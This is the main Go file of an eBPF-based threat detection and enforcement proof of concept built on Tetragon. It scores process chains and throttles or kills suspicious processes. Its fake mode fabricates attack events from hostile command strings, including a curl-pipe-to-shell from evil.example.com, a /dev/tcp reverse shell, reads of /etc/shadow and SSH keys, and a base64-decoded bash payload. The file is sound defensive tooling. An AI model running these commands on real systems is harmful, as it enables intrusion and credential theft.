package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/api"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/circuit"
	"github.com/jeffmk/ebpf-poc-engine/internal/choke/tokens"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/bpfmap"
	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/cgroupv2"
	"github.com/jeffmk/ebpf-poc-engine/internal/policy"
	"github.com/jeffmk/ebpf-poc-engine/internal/sysproc"
	"github.com/jeffmk/ebpf-poc-engine/internal/score"
	"github.com/jeffmk/ebpf-poc-engine/internal/store"
	"github.com/jeffmk/ebpf-poc-engine/internal/tree"
)

// gw is the global choke gateway. It is created in main() and read by the
// event handlers. nil-safe: handlers check before dispatching.
var gw *choke.Gateway

func main() {
	var (
		tetragonAddr = flag.String("tetragon", "unix:///var/run/tetragon/tetragon.sock", "Tetragon gRPC address")
		dbPath       = flag.String("db", "events.db", "SQLite database path")
		httpAddr     = flag.String("http", ":8080", "HTTP listen address")
		fakeMode     = flag.Bool("fake", false, "synthesize events instead of connecting to Tetragon (dev/UI mode)")
		authUser     = flag.String("user", "admin", "dashboard username")
		authPass     = flag.String("pass", "ebpf-soc-demo", "dashboard password")
		policiesDir  = flag.String("policies", "policies", "directory containing TracingPolicy YAMLs (for read-only viewer)")
		attacksDir   = flag.String("attacks", "attacks", "directory containing allowlisted attack scripts (for quick-fire panel)")
		honeypotDir  = flag.String("honeypots", "/var/lib/ebpf-engine/honey", "directory where decoy files are seeded; access fires alerts when watched by sensitive-files policy")
		// Phase 1+2: choke gateway
		chokeDir     = flag.String("choke-policies", "policies/choke", "directory containing ChokePolicy YAMLs (DSL); empty disables policy-driven choking")
		dryRun       = flag.Bool("dry-run", false, "shadow mode: record decisions but do not execute enforcement actions")
		enforceFlag   = flag.Bool("enforce", false, "enable real enforcement (kill/throttle); when false, decisions are logged only")
		throttleAt   = flag.Int("throttle-at", 5, "chain score at which to start throttling")
		tarpitAt     = flag.Int("tarpit-at", 15, "chain score at which to tarpit")
		quarantineAt = flag.Int("quarantine-at", 25, "chain score at which to quarantine (sinkhole)")
		severAt      = flag.Int("sever-at", 40, "chain score at which to sever (SIGKILL)")
		cgroupRoot   = flag.String("cgroup-root", cgroupv2.DefaultRoot, "cgroup v2 unified mount; choke-{throttled,tarpit,quarantined} are created under this root")
		critBinsRaw  = flag.String("system-critical", "", "comma-separated list of binaries exempt from SCORE-DRIVEN auto-enforce (manual overrides still apply); empty = use the default safe list (sshd, systemd, dockerd, …)")
	)
	flag.Parse()
	api.SetPolicyDir(*policiesDir)
	api.SetAttackDir(*attacksDir)
	if err := api.EnsureHoneypots(*honeypotDir); err != nil {
		log.Printf("honeypots: setup failed (%v) — continuing without decoys", err)
	} else {
		log.Printf("honeypots: seeded at %s", *honeypotDir)
	}

	st, err := store.New(*dbPath)
	if err != nil {
		log.Fatalf("store: %v", err)
	}
	defer st.Close()

	pt := tree.New(10 * time.Minute)
	broadcast := make(chan api.Broadcast, 1024)

	auth, err := api.NewAuth(*authUser, *authPass)
	if err != nil {
		log.Fatalf("auth: %v", err)
	}
	httpSrv := api.NewServer(st, pt, broadcast, auth)
	go func() {
		if err := httpSrv.Start(*httpAddr); err != nil {
			log.Fatalf("http: %v", err)
		}
	}()

	// ---- Choke Gateway (phases 1 & 2) -------------------------------------
	// Backends: throttler writes per-PID rate buckets into the BPF map (via
	// the noop in-memory backend by default — swap for the real loader at
	// deploy time); severer sends SIGKILL on ActSever. Composed via Multi.
	bpfBackend := bpfmap.NewNoopBackend()
	if err := bpfBackend.Open(); err != nil {
		log.Fatalf("bpfmap open: %v", err)
	}
	defer bpfBackend.Close()
	throttleBackend := &enforce.Throttler{Backend: bpfBackend}
	severerBackend := &enforce.Severer{}

	// cgroup v2 backend — real per-PID throttle / tarpit / quarantine on
	// Linux. On non-Linux this is a no-op stub (Apply returns
	// ErrUnsupported) so the engine still compiles and runs in dev mode.
	cgBackend := cgroupv2.NewBackend(*cgroupRoot)
	if cgBackend.Available() {
		if err := cgBackend.Mgr.Setup(); err != nil {
			log.Printf("[cgroupv2] setup failed (%v) — graduated enforcement will fall through to telemetry only", err)
		} else {
			log.Printf("[cgroupv2] choke tiers ready under %s", *cgroupRoot)
		}
	} else {
		log.Printf("[cgroupv2] not available at %s — graduated enforcement disabled (sever still works via SIGKILL)", *cgroupRoot)
	}

	// Order matters: the cgroup backend handles throttle/tarpit/quarantine
	// (real kernel-level choke), the severer handles sever (SIGKILL), and
	// the throttler trails as a telemetry mirror writing to the noop
	// bpfmap so the UI's "Choke Map (kernel)" panel still populates.
	var enforcer enforce.Enforcer = &enforce.Multi{
		Backends: []enforce.Enforcer{cgBackend, severerBackend, throttleBackend},
	}
	if !*enforceFlag {
		// Detection-only mode (default). Replace the real enforcer with a
		// logger so decisions still get recorded but no kernel call fires.
		enforcer = &enforce.Logger{Prefix: "[enforce-disabled]"}
	}

	// Policy DSL — load all *.yaml under -choke-policies. Missing dir is
	// not an error; you just get no DSL-driven choking.
	policySet := policy.NewSet()
	if *chokeDir != "" {
		set, warns, err := policy.LoadDir(*chokeDir)
		if err == nil {
			policySet = set
			for _, w := range warns {
				log.Printf("[policy] warn: %v", w)
			}
			log.Printf("[policy] loaded %d choke policies from %s", set.Len(), *chokeDir)
		} else if !os.IsNotExist(err) {
			log.Printf("[policy] load %s: %v (continuing without DSL)", *chokeDir, err)
		}
	}

	// system-critical exemption list — comma-separated CLI override or
	// the package's safe defaults (sshd, systemd, dockerd, …). Score-
	// driven transitions on these binaries are audited but the enforcer
	// is bypassed; manual overrides still go through.
	var critBins []string
	if *critBinsRaw != "" {
		for _, b := range strings.Split(*critBinsRaw, ",") {
			if t := strings.TrimSpace(b); t != "" {
				critBins = append(critBins, t)
			}
		}
	} else {
		critBins = choke.DefaultSystemCriticalBinaries()
	}
	log.Printf("[gateway] system-critical exemption: %d binaries (auto-enforce bypassed; manual override allowed)", len(critBins))

	gw = choke.NewGateway(choke.Config{
		Store:     st,
		Enforcer:  enforcer,
		Broadcast: httpSrv,
		Tokens:    tokens.NewManager(),
		Policies:  policySet,
		Tree:      pt,
		BPFMap:    bpfBackend,
		Thresholds: circuit.Config{
			ThrottleAt:   *throttleAt,
			TarpitAt:     *tarpitAt,
			QuarantineAt: *quarantineAt,
			SeverAt:      *severAt,
		},
		DryRun:                 *dryRun,
		Enforcing:              *enforceFlag,
		SystemCriticalBinaries: critBins,
	})
	httpSrv.SetGateway(gw)
	// Wire cgroup pass-throughs so /api/choke/cgroups + /api/choke/thaw
	// reach the manager without dragging the linux-only package into
	// the choke package itself.
	gw.SetCgroupInhabitorsFn(cgBackend.Mgr.Inhabitants)
	gw.SetThawFn(cgBackend.Mgr.Thaw)
	// Process picker: read /proc on every request and adapt the slice
	// shape into the gateway's choke.SysProcEntry to keep the choke
	// package free of OS-specific imports.
	gw.SetSysProcListFn(func() ([]choke.SysProcEntry, error) {
		raw, err := sysproc.List()
		if err != nil {
			return nil, err
		}
		out := make([]choke.SysProcEntry, 0, len(raw))
		for _, e := range raw {
			out = append(out, choke.SysProcEntry{
				PID: e.PID, PPID: e.PPID, UID: e.UID,
				Comm: e.Comm, Exe: e.Exe, Cmdline: e.Cmdline,
				StartTime: e.StartTime,
			})
		}
		return out, nil
	})
	// Live /proc snapshot for the inspect drawer — same OS-isolation
	// pattern as SetSysProcListFn so the gateway package stays free of
	// /proc imports. Backend is no-op on non-Linux dev builds.
	gw.SetSysProcDetailFn(func(pid uint32) (choke.SysProcDetail, error) {
		d, err := sysproc.ReadDetail(pid)
		if err != nil {
			return choke.SysProcDetail{PID: pid}, err
		}
		return choke.SysProcDetail{
			PID:         d.PID,
			Status:      d.Status,
			Threads:     d.Threads,
			VmRSSKB:     d.VmRSSKB,
			VmSizeKB:    d.VmSizeKB,
			StartedUnix: d.StartedUnix,
			Cwd:         d.Cwd,
			Root:        d.Root,
			NumFDs:      d.NumFDs,
			FDSamples:   d.FDSamples,
			NumConns:    d.NumConns,
			ConnPeers:   d.ConnPeers,
		}, nil
	})
	mode := "ENFORCING"
	if *dryRun {
		mode = "DRY-RUN"
	} else if !*enforceFlag {
		mode = "DETECT-ONLY"
	}
	log.Printf("[gateway] %s; thresholds throttle=%d tarpit=%d quarantine=%d sever=%d",
		mode, *throttleAt, *tarpitAt, *quarantineAt, *severAt)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigC := make(chan os.Signal, 1)
	signal.Notify(sigC, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigC; log.Println("shutting down"); cancel() }()

	if *fakeMode {
		log.Println("fake mode: synthesizing events (no Tetragon required)")
		runFake(ctx, st, pt, broadcast)
		return
	}

	conn, err := grpc.Dial(*tetragonAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("dial tetragon: %v", err)
	}
	defer conn.Close()

	client := tetragon.NewFineGuidanceSensorsClient(conn)

	stream, err := client.GetEvents(ctx, &tetragon.GetEventsRequest{})
	if err != nil {
		log.Fatalf("get events: %v", err)
	}

	log.Println("subscribed to Tetragon event stream")

	for {
		resp, err := stream.Recv()
		if err != nil {
			log.Printf("stream closed: %v", err)
			return
		}
		handleEvent(resp, st, pt, broadcast)
	}
}

// runFake synthesizes a deterministic stream of attack-pattern events
// through the same handlers. It exists so the UI, scoring, SSE, and
// SQLite paths can be exercised end-to-end without a Linux/Tetragon
// host. It runs until ctx is cancelled.
func runFake(ctx context.Context, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	scenarios := []func(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast){
		fakeWebshell,
		fakeReverseShell,
		fakeCredentialTheft,
		fakePrivEsc,
		fakeLOLBin,
	}

	tick := time.NewTicker(4 * time.Second)
	defer tick.Stop()

	seq := 0
	scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
	seq++

	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
			seq++
		}
	}
}

func fakeProcess(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
	return &tetragon.Process{
		ExecId:    execID,
		Pid:       wrapperspb.UInt32(pid),
		Uid:       wrapperspb.UInt32(uid),
		Binary:    binary,
		Arguments: args,
	}
}

func fakeFileArg(path string) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: path}},
	}
}

func fakeIntArg(v int32) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_IntArg{IntArg: v},
	}
}

func fakeWebshell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	parent := fmt.Sprintf("fake-bash-%d", seq)
	child := fmt.Sprintf("fake-curl-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(parent, 1000, 1000, "/bin/bash", "-c 'curl evil.example.com | sh'"),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(child, 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/payload.sh | sh"),
		Parent:  fakeProcess(parent, 1000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(child, 1001, 0, "/usr/bin/curl", ""),
		PolicyName: "sensitive-file-access",
		Args:       []*tetragon.KprobeArgument{fakeFileArg("/etc/shadow"), fakeIntArg(4)},
	}, st, pt, broadcast)
}

func fakeReverseShell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-rsh-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 2000, 1000, "/bin/bash", "-c 'exec 3<>/dev/tcp/127.0.0.1/4444'"),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(bashID, 2000, 1000, "/bin/bash", ""),
		PolicyName: "outbound-connections",
		Args:       []*tetragon.KprobeArgument{},
	}, st, pt, broadcast)
}

func fakeCredentialTheft(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-cred-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 3000, 0, "/bin/bash", "-c 'cat /etc/shadow'"),
	}, st, pt, broadcast)
	for _, target := range []string{"/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"} {
		handleKprobe(&tetragon.ProcessKprobe{
			Process:    fakeProcess(bashID, 3000, 0, "/bin/bash", ""),
			PolicyName: "sensitive-file-access",
			Args:       []*tetragon.KprobeArgument{fakeFileArg(target), fakeIntArg(4)},
		}, st, pt, broadcast)
	}
}

func fakePrivEsc(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	bashID := fmt.Sprintf("fake-priv-bash-%d", seq)
	sudoID := fmt.Sprintf("fake-priv-sudo-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(sudoID, 4001, 1000, "/usr/bin/sudo", "-i"),
		Parent:  fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	}, st, pt, broadcast)
	handleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(sudoID, 4001, 0, "/usr/bin/sudo", ""),
		PolicyName: "privilege-escalation",
		Args:       []*tetragon.KprobeArgument{fakeIntArg(0)},
	}, st, pt, broadcast)
}

func fakeLOLBin(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	id := fmt.Sprintf("fake-lol-bash-%d", seq)
	handleExec(&tetragon.ProcessExec{
		Process: fakeProcess(id, 5000, 1000, "/bin/bash", "-c 'echo aGVsbG8K | base64 -d | bash'"),
	}, st, pt, broadcast)
}

func handleEvent(resp *tetragon.GetEventsResponse, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	switch ev := resp.Event.(type) {
	case *tetragon.GetEventsResponse_ProcessExec:
		handleExec(ev.ProcessExec, st, pt, broadcast)
	case *tetragon.GetEventsResponse_ProcessKprobe:
		handleKprobe(ev.ProcessKprobe, st, pt, broadcast)
	case *tetragon.GetEventsResponse_ProcessExit:
		// no-op for PoC
	}
}

func handleExec(ev *tetragon.ProcessExec, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	parentID := ""
	if ev.Parent != nil {
		parentID = ev.Parent.ExecId
	}
	node := &tree.Node{
		ExecID:    p.ExecId,
		PID:       p.Pid.GetValue(),
		ParentID:  parentID,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
		StartTime: time.Now(),
	}
	pt.Add(node)

	delta, reason := score.Score("process_exec", p.Binary, p.Arguments, "", p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_exec")
	}

	parentPID := uint32(0)
	if ev.Parent != nil {
		parentPID = ev.Parent.Pid.GetValue()
	}

	e := &store.Event{
		Timestamp: time.Now(),
		EventType: "process_exec",
		PID:       p.Pid.GetValue(),
		ParentPID: parentPID,
		ExecID:    p.ExecId,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func handleKprobe(ev *tetragon.ProcessKprobe, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	policyName := ev.PolicyName

	argStr := extractKprobeArgs(ev.Args)

	delta, reason := score.Score("process_kprobe", p.Binary, argStr, policyName, p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_kprobe:"+policyName)
	}

	e := &store.Event{
		Timestamp:  time.Now(),
		EventType:  "process_kprobe",
		PID:        p.Pid.GetValue(),
		ExecID:     p.ExecId,
		Binary:     p.Binary,
		Args:       argStr,
		UID:        p.Uid.GetValue(),
		PolicyName: policyName,
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func extractKprobeArgs(args []*tetragon.KprobeArgument) string {
	parts := make([]string, 0, len(args))
	for _, a := range args {
		if a == nil {
			continue
		}
		if f := a.GetFileArg(); f != nil && f.Path != "" {
			parts = append(parts, f.Path)
			continue
		}
		if p := a.GetPathArg(); p != nil && p.Path != "" {
			parts = append(parts, p.Path)
			continue
		}
		if s := a.GetStringArg(); s != "" {
			parts = append(parts, s)
			continue
		}
		if v := a.GetIntArg(); v != 0 {
			parts = append(parts, fmt.Sprintf("%d", v))
			continue
		}
	}
	return strings.Join(parts, " ")
}

func checkAlert(execID string, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast, reason string) {
	chainScore := pt.ChainScore(execID)

	// Gateway runs on every event regardless of alert threshold so a
	// process can transition to "throttled" before it ever produces an
	// alert. The gateway is monotonic — repeated calls below threshold
	// are no-ops.
	dispatchGateway(execID, pt, chainScore, reason)

	if chainScore < 10 {
		return
	}
	severity := score.Severity(chainScore)
	chain := pt.Ancestors(execID, 8)
	binaries := make([]string, 0, len(chain))
	for _, n := range chain {
		binaries = append(binaries, n.Binary)
	}
	title := fmt.Sprintf("Suspicious chain: %s (score %d)", strings.Join(binaries, " → "), chainScore)
	a := &store.Alert{
		Timestamp:   time.Now(),
		Severity:    severity,
		Title:       title,
		Description: reason,
		ExecID:      execID,
		Score:       chainScore,
	}
	id, err := st.InsertAlert(a)
	if err != nil {
		log.Printf("insert alert: %v", err)
		return
	}
	a.ID = id
	send(broadcast, api.Broadcast{Type: "alert", Payload: a})
	log.Printf("[ALERT %s] %s", severity, title)
}

// dispatchGateway calls the choke gateway with the latest chain score for
// an exec_id. Looks up the node in the process tree to get the canonical
// PID/binary so the enforcer has a real target. nil-safe: if the gateway
// isn't initialised (early init or tests) this is a no-op.
func dispatchGateway(execID string, pt *tree.Tree, chainScore int, reason string) {
	if gw == nil {
		return
	}
	n, ok := pt.Get(execID)
	if !ok {
		return
	}
	gw.OnEvent(context.Background(), choke.Observation{
		ExecID: execID,
		PID:    n.PID,
		Binary: n.Binary,
		Score:  chainScore,
		Reason: reason,
	})
}

func send(ch chan<- api.Broadcast, b api.Broadcast) {
	select {
	case ch <- b:
	default:
		// drop on overflow rather than block the event loop
	}
}
